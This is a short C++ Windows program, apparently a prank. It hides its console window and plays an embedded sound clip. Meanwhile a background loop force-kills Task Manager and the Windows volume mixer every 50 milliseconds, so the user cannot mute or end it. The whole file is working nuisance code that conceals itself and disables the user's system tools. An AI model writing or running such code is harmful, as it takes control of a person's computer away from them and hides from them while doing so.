#include <windows.h>
#include <mmsystem.h>
#include <fstream>
#include <atlstr.h>
#include <iostream>
#include <shobjidl_core.h>

#include "resource.h"

#pragma comment(lib, "winmm.lib")

using namespace std;

int loop();
bool exitNow = false;

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)loop, NULL, NULL, NULL);
    int a = PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE);
    
    exitNow = true;
    return 0;
}

int loop() {
    while (exitNow == false)
    {
        system("taskkill -f -im Taskmgr.exe > NUL 2>&1");
        system("taskkill -f -im SndVol.exe > NUL 2>&1");
        Sleep(50);
    }
    return 1;
}
